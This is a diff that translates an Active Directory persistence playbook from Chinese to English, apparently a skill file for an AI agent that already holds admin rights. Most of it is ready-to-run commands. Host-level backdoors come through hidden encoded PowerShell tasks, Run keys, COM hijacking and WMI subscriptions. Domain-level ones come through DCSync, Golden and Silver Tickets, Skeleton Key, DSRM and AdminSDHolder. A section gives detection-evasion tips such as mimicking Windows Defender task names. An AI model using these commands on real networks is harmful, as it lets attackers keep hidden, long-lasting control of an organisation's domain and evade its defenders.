@@ -1,184 +1,188 @@
 ---
 name: ad-persistence
-description: "AD 域环境持久化技术。当已获取域管/本地管理员权限、需要建立持久访问以确保重启或密码更改后仍能回到目标环境时使用。覆盖主机级持久化（计划任务/注册表Run/COM劫持/WMI事件订阅/Windows服务/启动文件夹）、域级持久化（Golden Ticket/Silver Ticket/Skeleton Key/DSRM/AdminSDHolder）、DCShadow/GoldenGMSA高级技术、清理命令与检测规避"
+description: "AD domain persistence techniques. Use when you already hold domain admin/local administrator rights and need to establish persistent access so you can still return to the target environment after a reboot or password change. Covers host-level persistence (scheduled task/registry Run/COM hijack/WMI event subscription/Windows service/startup folder), domain-level persistence (Golden Ticket/Silver Ticket/Skeleton Key/DSRM/AdminSDHolder), advanced techniques such as DCShadow/GoldenGMSA, cleanup commands, and detection evasion"
+zh-signals: "在 AD 域环境建立持久化访问，覆盖主机级与域级技术如 Golden Ticket、DSRM、AdminSDHolder、DCShadow。信号:AD持久化,Golden Ticket,DSRM,AdminSDHolder,DCShadow"
+when-to-use: >-
+  Use when you hold domain admin or local admin rights and need persistent access that survives
+  reboots or password changes on an authorized Active Directory target.
 metadata:
   tags: "persistence,golden-ticket,silver-ticket,skeleton-key,dsrm,adminsdholder,scheduled-task,com-hijack,wmi-subscription,registry-run,sharpersist,dcshadow,goldengmsa,shadow-principals,pam-trust,delegation-to-krbtgt,kds-root-key"
   category: "lateral"
 ---
 
-# AD 持久化方法论
+# AD Persistence Methodology
 
-获取高权限后的核心目标: 建立持久访问，确保重启/密码更改后仍能回到目标环境。
+Core objective after obtaining high privileges: establish persistent access so you can still return to the target environment after a reboot or password change.
 
-## 深入参考（必读）
+## Further Reading (Must Read)
 
-- 主机级持久化完整命令与清理 → [references/host-persistence.md](references/host-persistence.md)
-- 域级持久化完整命令与清理 → [references/domain-persistence.md](references/domain-persistence.md)
-- → [references/advanced-persistence.md](references/advanced-persistence.md) — DCShadow、GoldenGMSA、krbtgt 委派持久化、Shadow Principals (PAM Trust)
+- Full commands and cleanup for host-level persistence → [references/host-persistence.md](references/host-persistence.md)
+- Full commands and cleanup for domain-level persistence → [references/domain-persistence.md](references/domain-persistence.md)
+- → [references/advanced-persistence.md](references/advanced-persistence.md) — DCShadow, GoldenGMSA, krbtgt delegation persistence, Shadow Principals (PAM Trust)
 
 ---
 
-## Phase 1: 持久化决策
+## Phase 1: Persistence Decision
 
-### 1.1 当前权限评估
+### 1.1 Current Privilege Assessment
 
 ```powershell
-# 检查当前权限
+# Check current privileges
 whoami /priv
 whoami /groups
 
-# 是否为域管
+# Check whether you are a domain admin
 net group "Domain Admins" /domain
 
-# 是否为本地管理员
+# Check whether you are a local administrator
 net localgroup Administrators
 ```
 
-### 1.2 决策树
+### 1.2 Decision Tree
 
 ```
-[开始] 需要建立持久化
+[Start] Need to establish persistence
     |
     v
-[评估] 当前权限级别?
+[Assess] Current privilege level?
     |
-    +-- 普通域用户 --> 先提权，持久化意义不大
+    +-- Normal domain user --> Escalate privileges first; persistence has little value
     |
-    +-- 本地管理员 / SYSTEM --> [主机级持久化] Phase 2
+    +-- Local admin / SYSTEM --> [Host-level persistence] Phase 2
     |       |
-    |       +-- 需要隐蔽 --> COM 劫持 / WMI 事件订阅
-    |       +-- 需要可靠 --> 计划任务 / Windows 服务
-    |       +-- 仅需用户级 --> 注册表 Run / 启动文件夹
+    |       +-- Need stealth --> COM hijack / WMI event subscription
+    |       +-- Need reliability --> Scheduled task / Windows service
+    |       +-- User level only --> Registry Run / Startup folder
     |
-    +-- 域管理员 --> [域级持久化] Phase 3
+    +-- Domain admin --> [Domain-level persistence] Phase 3
             |
-            +-- 有 krbtgt 哈希 --> Golden Ticket (最强)
-            +-- 有服务账户哈希 --> Silver Ticket (隐蔽)
-            +-- 有 DC 访问权限 --> Skeleton Key / DSRM
-            +-- 需要 ACL 后门 --> AdminSDHolder
+            +-- Have krbtgt hash --> Golden Ticket (strongest)
+            +-- Have service account hash --> Silver Ticket (stealthy)
+            +-- Have DC access --> Skeleton Key / DSRM
+            +-- Need ACL backdoor --> AdminSDHolder
 ```
 
-### 1.3 隐蔽性评估
+### 1.3 Stealth Assessment
 
-| 技术 | 检测难度 | 持久时间 | 权限要求 | 推荐场景 |
+| Technique | Detection Difficulty | Persistence Duration | Privilege Required | Recommended Scenario |
 |------|----------|----------|----------|----------|
-| 计划任务 | 中 | 永久 | 用户/SYSTEM | 快速部署 |
-| 启动文件夹 | 低 | 永久 | 用户 | 临时/低价值 |
-| 注册表 Run | 中 | 永久 | 用户/SYSTEM | 通用 |
-| COM 劫持 | 高 | 永久 | 用户 | 长期隐蔽 |
-| Windows 服务 | 中 | 永久 | SYSTEM | 系统级访问 |
-| WMI 事件订阅 | 高 | 永久 | SYSTEM | 高隐蔽需求 |
-| Golden Ticket | 高 | 10 年 | krbtgt 哈希 | 域级最强 |
-| Silver Ticket | 高 | 票据有效期 | 服务账户哈希 | 不触及 DC |
-| Skeleton Key | 中 | 重启失效 | DC 内存访问 | 临时万能钥匙 |
-| DSRM | 高 | 永久 | DC 本地管理员 | 隐蔽后门 |
-| AdminSDHolder | 中 | 永久(60min 同步) | 域管理员 | ACL 持久化 |
+| Scheduled task | Medium | Permanent | User/SYSTEM | Fast deployment |
+| Startup folder | Low | Permanent | User | Temporary/low value |
+| Registry Run | Medium | Permanent | User/SYSTEM | General purpose |
+| COM hijack | High | Permanent | User | Long-term stealth |
+| Windows service | Medium | Permanent | SYSTEM | System-level access |
+| WMI event subscription | High | Permanent | SYSTEM | High stealth requirement |
+| Golden Ticket | High | 10 years | krbtgt hash | Strongest at domain level |
+| Silver Ticket | High | Ticket lifetime | Service account hash | Does not touch the DC |
+| Skeleton Key | Medium | Lost on reboot | DC memory access | Temporary master key |
+| DSRM | High | Permanent | DC local admin | Stealth backdoor |
+| AdminSDHolder | Medium | Permanent (60min sync) | Domain admin | ACL persistence |
 
 ---
 
-## Phase 2: 主机级持久化
+## Phase 2: Host-Level Persistence
 
-### 2.1 计划任务
+### 2.1 Scheduled Task
 
-**权限**: 用户级或 SYSTEM | **检测难度**: 中
+**Privilege**: User level or SYSTEM | **Detection Difficulty**: Medium
 
 ```powershell
-# SharPersist - 每小时执行
+# SharPersist - run every hour
 SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64" -n "Updater" -m add -o hourly
 
-# schtasks - 开机启动 / 定时执行
+# schtasks - run at boot / scheduled execution
 schtasks /create /tn "WinDefUpdate" /tr "C:\Windows\Temp\svc.exe" /sc onlogon /ru SYSTEM /f
 schtasks /create /tn "HealthCheck" /tr "C:\Windows\Temp\svc.exe" /sc minute /mo 30 /ru SYSTEM /f
 
-# 清理
+# Cleanup
 schtasks /delete /tn "WinDefUpdate" /f
 ```
 
-### 2.2 启动文件夹
+### 2.2 Startup Folder
 
-**权限**: 用户 | **检测难度**: 低
+**Privilege**: User | **Detection Difficulty**: Low
 
 ```powershell
 SharPersist.exe -t startupfolder -c "powershell.exe" -a "-nop -w hidden -enc BASE64" -f "UserEnvSetup" -m add
-# 路径: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
+# Path: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
 
-# 清理
+# Cleanup
 Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk"
 ```
 
-### 2.3 注册表 Run 键
+### 2.3 Registry Run Key
 
-**权限**: 用户 (HKCU) / SYSTEM (HKLM) | **检测难度**: 中
+**Privilege**: User (HKCU) / SYSTEM (HKLM) | **Detection Difficulty**: Medium
 
 ```bash
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "C:\ProgramData\updater.exe" /f
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "C:\ProgramData\updater.exe" /f
 
-# 清理
+# Cleanup
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /f
 ```
 
-> 更多注册表位置 (Winlogon Shell/Userinit, IFEO) 见 [references/host-persistence.md](references/host-persistence.md)
+> For more registry locations (Winlogon Shell/Userinit, IFEO) see [references/host-persistence.md](references/host-persistence.md)
 
-### 2.4 COM 劫持
+### 2.4 COM Hijack
 
-**权限**: 用户 | **检测难度**: 高
+**Privilege**: User | **Detection Difficulty**: High
 
-原理: HKCU 中注册同 CLSID 的恶意 DLL，优先于 HKLM 中的正常组件被加载。
+Principle: register a malicious DLL under the same CLSID in HKCU so it is loaded before the legitimate component in HKLM.
 
 ```powershell
-# 在 HKCU 创建劫持项 (HKLM 中已存在该 CLSID)
+# Create the hijack entry in HKCU (the CLSID already exists in HKLM)
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{TARGET-CLSID}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}" -Name "InprocServer32" -Value "C:\Payloads\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 
-# 清理
+# Cleanup
 Remove-Item -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}" -Recurse
 ```
 
-> CLSID 发现方法 (procmon/计划任务枚举) 见 [references/host-persistence.md](references/host-persistence.md)
+> For CLSID discovery methods (procmon/scheduled task enumeration) see [references/host-persistence.md](references/host-persistence.md)
 
-### 2.5 Windows 服务
+### 2.5 Windows Service
 
-**权限**: SYSTEM | **检测难度**: 中
+**Privilege**: SYSTEM | **Detection Difficulty**: Medium
 
 ```bash
 sc create "WinDefSvc" binPath= "C:\Windows\legit-svc.exe" start= auto DisplayName= "Windows Defender Update"
 sc start "WinDefSvc"
 
-# 清理
+# Cleanup
 sc stop "WinDefSvc" && sc delete "WinDefSvc"
 ```
 
-> SYSTEM 进程无法进行网络 NTLM 认证，应使用 SMB/TCP/DNS 通道而非 HTTP。
+> A SYSTEM process cannot perform network NTLM authentication; use an SMB/TCP/DNS channel instead of HTTP.
 
-### 2.6 WMI 事件订阅
+### 2.6 WMI Event Subscription
 
-**权限**: SYSTEM | **检测难度**: 高
+**Privilege**: SYSTEM | **Detection Difficulty**: High
 
-三组件架构: EventFilter(触发条件) + EventConsumer(执行动作) + FilterToConsumerBinding(绑定)。
+Three-component architecture: EventFilter (trigger condition) + EventConsumer (action to execute) + FilterToConsumerBinding (binding).
 
 ```powershell
-# PowerLurk 一键创建
+# PowerLurk one-shot creation
 Import-Module .\PowerLurk.ps1
 Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\artifact.exe" -Trigger ProcessStart -ProcessName notepad.exe
 
-# 清理
+# Cleanup
 Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
 ```
 
-> 完整三组件 PowerShell/wmic 手动创建代码见 [references/host-persistence.md](references/host-persistence.md)
+> For the full manual three-component PowerShell/wmic creation code see [references/host-persistence.md](references/host-persistence.md)
 
 ---
 
-## Phase 3: 域级持久化
+## Phase 3: Domain-Level Persistence
 
 ### 3.1 Golden Ticket
 
-**要求**: krbtgt NTLM 哈希 (DCSync 获取) | **有效期**: 默认 10 年
+**Requirement**: krbtgt NTLM hash (obtained via DCSync) | **Validity**: 10 years by default
 
 ```bash
-# Linux: DCSync + 伪造 + 使用
+# Linux: DCSync + forge + use
 impacket-secretsdump DOMAIN/admin:PASS@DC_IP -just-dc-user krbtgt
 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
 export KRB5CCNAME=Administrator.ccache
@@ -190,11 +194,11 @@ psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
 Rubeus.exe golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:KRBTGT_HASH /ptt
 ```
 
-**清理**: 两次更改 krbtgt 密码 (AD 保留前一次密码)。跨域场景 /sids 参数见 references。
+**Cleanup**: change the krbtgt password twice (AD retains the previous password). For cross-domain scenarios and the /sids parameter see references.
 
 ### 3.2 Silver Ticket
 
-**要求**: 服务账户 NTLM 哈希 | **优势**: 不触及 DC
+**Requirement**: service account NTLM hash | **Advantage**: does not touch the DC
 
 ```bash
 ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn cifs/target.domain.local Administrator
@@ -204,35 +208,35 @@ ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn 
 Rubeus.exe silver /service:cifs/TARGET /user:Administrator /domain:DOMAIN /sid:S-1-5-21-xxx /rc4:SVC_HASH /ptt
 ```
 
-常用 SPN: `cifs/HOST`(文件), `HOST/DC`(PsExec), `MSSQLSvc/DB`(SQL), `LDAP/DC`(DCSync)。**清理**: 更改服务账户密码。
+Common SPNs: `cifs/HOST` (files), `HOST/DC` (PsExec), `MSSQLSvc/DB` (SQL), `LDAP/DC` (DCSync). **Cleanup**: change the service account password.
 
 ### 3.3 Skeleton Key
 
-**要求**: DC 内存访问 (域管 + SeDebugPrivilege) | **有效期**: 直到 DC 重启
+**Requirement**: DC memory access (domain admin + SeDebugPrivilege) | **Validity**: until the DC reboots
 
 ```powershell
 mimikatz # privilege::debug
 mimikatz # misc::skeleton
-# 所有域用户均可使用密码 "mimikatz" 登录，原密码仍有效
+# All domain users can log in with the password "mimikatz"; original passwords remain valid
 ```
 
-**清理**: 重启域控即可。仅内存级，需配合其他技术。
+**Cleanup**: simply reboot the domain controller. Memory-only, so it must be combined with other techniques.
 
-### 3.4 DSRM (目录服务还原模式)
+### 3.4 DSRM (Directory Service Restore Mode)
 
-**要求**: DC 本地管理员 | **有效期**: 永久
+**Requirement**: DC local admin | **Validity**: permanent
 
 ```powershell
-mimikatz # lsadump::sam                  # 获取 DSRM 哈希 (SAM 中 Administrator)
+mimikatz # lsadump::sam                  # Obtain the DSRM hash (Administrator in the SAM)
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 sekurlsa::pth /domain:DC_HOSTNAME /user:Administrator /ntlm:DSRM_HASH /run:powershell.exe
 ```
 
-**清理**: `Remove-ItemProperty "HKLM:\...\Lsa\" -Name "DsrmAdminLogonBehavior"`
+**Cleanup**: `Remove-ItemProperty "HKLM:\...\Lsa\" -Name "DsrmAdminLogonBehavior"`
 
 ### 3.5 AdminSDHolder
 
-**要求**: 域管理员 | SDProp 每 60 分钟同步 ACL 到所有受保护对象
+**Requirement**: domain admin | SDProp syncs the ACL to all protected objects every 60 minutes
 
 ```powershell
 Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All
@@ -242,79 +246,79 @@ Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=loc
 impacket-dacledit -action write -rights FullControl -principal attacker -target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" DOMAIN/admin:PASS -dc-ip DC_IP
 ```
 
-**清理**: `Remove-DomainObjectAcl ... -PrincipalIdentity attacker -Rights All` + 等 SDProp 同步
+**Cleanup**: `Remove-DomainObjectAcl ... -PrincipalIdentity attacker -Rights All` + wait for SDProp sync
 
 ---
 
-## Phase 4: 清理与检测规避
+## Phase 4: Cleanup and Detection Evasion
 
-### 4.1 清理命令速查
+### 4.1 Cleanup Command Quick Reference
 
-| 技术 | 安装命令 | 清理命令 |
+| Technique | Install Command | Cleanup Command |
 |------|----------|----------|
-| 计划任务 | `schtasks /create /tn NAME ...` | `schtasks /delete /tn NAME /f` |
-| 启动文件夹 | SharPersist `-m add` | `Remove-Item ...Startup\NAME.lnk` |
-| 注册表 Run | `reg add ...Run /v NAME` | `reg delete ...Run /v NAME /f` |
-| COM 劫持 | `New-Item HKCU:...CLSID` | `Remove-Item HKCU:...CLSID -Recurse` |
-| Windows 服务 | `sc create NAME` | `sc stop NAME && sc delete NAME` |
-| WMI 事件 | `Register-MaliciousWmiEvent` | `Get-WmiEvent NAME \| Remove-WmiObject` |
-| Golden Ticket | `ticketer.py -nthash` | 两次更改 krbtgt 密码 |
-| Silver Ticket | `ticketer.py -spn` | 更改服务账户密码 |
-| Skeleton Key | `misc::skeleton` | 重启域控制器 |
-| DSRM | 修改 DsrmAdminLogonBehavior | 删除注册表项 |
-| AdminSDHolder | `Add-DomainObjectAcl` | `Remove-DomainObjectAcl` + 等待 SDProp |
+| Scheduled task | `schtasks /create /tn NAME ...` | `schtasks /delete /tn NAME /f` |
+| Startup folder | SharPersist `-m add` | `Remove-Item ...Startup\NAME.lnk` |
+| Registry Run | `reg add ...Run /v NAME` | `reg delete ...Run /v NAME /f` |
+| COM hijack | `New-Item HKCU:...CLSID` | `Remove-Item HKCU:...CLSID -Recurse` |
+| Windows service | `sc create NAME` | `sc stop NAME && sc delete NAME` |
+| WMI event | `Register-MaliciousWmiEvent` | `Get-WmiEvent NAME \| Remove-WmiObject` |
+| Golden Ticket | `ticketer.py -nthash` | Change the krbtgt password twice |
+| Silver Ticket | `ticketer.py -spn` | Change the service account password |
+| Skeleton Key | `misc::skeleton` | Reboot the domain controller |
+| DSRM | Modify DsrmAdminLogonBehavior | Delete the registry value |
+| AdminSDHolder | `Add-DomainObjectAcl` | `Remove-DomainObjectAcl` + wait for SDProp |
 
-### 4.2 检测规避要点
-
-```
-主机级:
-  - 任务名称模仿合法系统任务 (Windows Defender, Microsoft Update)
-  - 二进制文件放置在合法路径 (C:\Windows, C:\ProgramData)
-  - 使用 DLL 劫持而非独立 EXE
-  - WMI 触发条件设置合理间隔，避免频繁执行
-
-域级:
-  - Golden Ticket 用户名使用真实存在的用户
-  - Silver Ticket 只针对需要的特定服务
-  - 避免跨域使用伪造票据 (日志异常)
-  - AdminSDHolder 添加低调权限而非 FullControl
-```
-
----
-
-## 组合策略
+### 4.2 Detection Evasion Essentials
 
 ```
-最大持久性 (多层冗余):
-  域管: Golden Ticket + AdminSDHolder + 计划任务
-  本管: WMI 事件订阅 + COM 劫持 + 注册表 Run
+Host-level:
+  - Mimic legitimate system task names (Windows Defender, Microsoft Update)
+  - Place binaries in legitimate paths (C:\Windows, C:\ProgramData)
+  - Use DLL hijacking instead of a standalone EXE
+  - Set a reasonable interval on WMI trigger conditions to avoid frequent execution
 
-最大隐蔽 (单一精准):
-  域管: Silver Ticket (仅特定服务，不触及 DC)
-  本管: COM 劫持 (DLL 形式，检测难度最高)
+Domain-level:
+  - Use a real existing username for the Golden Ticket
+  - Target only the specific service you need with the Silver Ticket
+  - Avoid using forged tickets across domains (anomalous logs)
+  - Grant low-profile permissions instead of FullControl for AdminSDHolder
 ```
 
 ---
 
-## 常见问题
+## Combination Strategies
 
-- **计划任务被删除?** -- 换用 COM 劫持或 WMI 事件订阅，WMI 三组件全删才能清除
-- **Golden Ticket 不工作?** -- 确认 krbtgt 哈希正确、域 SID 正确、时间偏差 < 5 分钟
-- **Skeleton Key 重启失效?** -- 设计如此(仅内存)，配合 Golden Ticket 或计划任务
-- **AdminSDHolder 没生效?** -- SDProp 每 60 分钟运行，手动触发 `Invoke-ADSDPropagation`
+```
+Maximum persistence (multi-layer redundancy):
+  Domain admin: Golden Ticket + AdminSDHolder + Scheduled task
+  Local admin: WMI event subscription + COM hijack + Registry Run
+
+Maximum stealth (single precise technique):
+  Domain admin: Silver Ticket (specific service only, does not touch the DC)
+  Local admin: COM hijack (DLL form, highest detection difficulty)
+```
 
 ---
 
-## 工具参考
+## FAQ
 
-| 工具 | 用途 | 平台 |
+- **Scheduled task deleted?** -- Switch to COM hijack or WMI event subscription; all three WMI components must be deleted to fully clear it
+- **Golden Ticket not working?** -- Confirm the krbtgt hash is correct, the domain SID is correct, and clock skew is < 5 minutes
+- **Skeleton Key lost after reboot?** -- By design (memory-only); combine it with a Golden Ticket or a scheduled task
+- **AdminSDHolder not taking effect?** -- SDProp runs every 60 minutes; trigger it manually with `Invoke-ADSDPropagation`
+
+---
+
+## Tool Reference
+
+| Tool | Purpose | Platform |
 |------|------|------|
-| SharPersist | 多种主机持久化技术 (任务/注册表/服务/COM/启动) | Windows |
-| PowerLurk | WMI 事件订阅 | Windows |
-| SharpStay | C# 持久化工具 | Windows |
-| Rubeus | Golden/Silver Ticket 创建 | Windows |
-| Mimikatz | Skeleton Key/DSRM/票据伪造 | Windows |
-| ticketer.py | Kerberos 票据伪造 (impacket) | Linux |
-| impacket-secretsdump | DCSync 获取哈希 | Linux |
-| impacket-dacledit | ACL 修改 (AdminSDHolder) | Linux |
-| Incognito | Token 窃取与模拟 | Windows |
+| SharPersist | Multiple host persistence techniques (task/registry/service/COM/startup) | Windows |
+| PowerLurk | WMI event subscription | Windows |
+| SharpStay | C# persistence tool | Windows |
+| Rubeus | Golden/Silver Ticket creation | Windows |
+| Mimikatz | Skeleton Key/DSRM/ticket forging | Windows |
+| ticketer.py | Kerberos ticket forging (impacket) | Linux |
+| impacket-secretsdump | DCSync hash retrieval | Linux |
+| impacket-dacledit | ACL modification (AdminSDHolder) | Linux |
+| Incognito | Token theft and impersonation | Windows |
